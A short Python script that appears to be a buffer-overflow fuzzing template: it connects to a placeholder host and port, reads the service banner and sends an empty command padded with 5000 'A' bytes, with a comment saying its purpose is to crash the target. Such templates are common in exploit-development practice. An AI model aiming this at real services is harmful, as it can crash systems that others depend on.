#!/usr/bin/env python3

import socket

## set host_ip and port here

host, port = '123.456.789.1', 123456

## set command here

command = b""

## crash this shit ... if it's not working, increase the ilteration

payload = b"".join(
	[
	command,
	b"A" * 5000,
	]
)

## connect to the target and send the payload

with socket.socket() as s:
	s.connect((host, port))

	print(s.recv(4096))
	#banner = s.resv(4096).decode("utf-8").strip()
	s.send(payload)
